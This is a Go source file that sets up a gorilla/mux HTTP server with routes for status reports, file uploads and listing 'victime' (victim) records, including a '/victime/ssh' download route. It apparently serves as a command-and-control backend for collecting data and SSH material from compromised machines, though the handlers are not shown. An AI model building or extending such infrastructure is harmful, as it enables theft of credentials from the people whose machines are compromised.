package main

import (
	"net/http"
	routes "server/src/routes"

	"github.com/gorilla/handlers"
	"github.com/gorilla/mux"
)

func main() {
	// Create a new router instance
	r := mux.NewRouter()

	// Route for status
	r.HandleFunc("/status", routes.RoutePostStatus).Methods("POST")
	r.HandleFunc("/status/update", routes.RouteChangeStatus).Methods("POST")

	// Route for Get Cible
	r.HandleFunc("/victime/all", routes.RouteGetAllVictime).Methods("GET")
	r.HandleFunc("/victime", routes.RouteGetVictime).Methods("GET")
	r.HandleFunc("/victime/ssh", routes.RouteDownloadFile).Methods("GET")

	// Route for file
	r.HandleFunc("/upload", routes.RoutePostFile).Methods("POST")

	// Apply CORS policy
	corsOrigins := handlers.AllowedOrigins([]string{"*"})
	corsMethods := handlers.AllowedMethods([]string{"GET", "POST", "PUT", "DELETE"})
	corsHeaders := handlers.AllowedHeaders([]string{"X-Requested-With", "Content-Type", "Authorization"})

	// Start Server Port 8080
	http.ListenAndServe(":8080", handlers.CORS(corsOrigins, corsMethods, corsHeaders)(r))
}
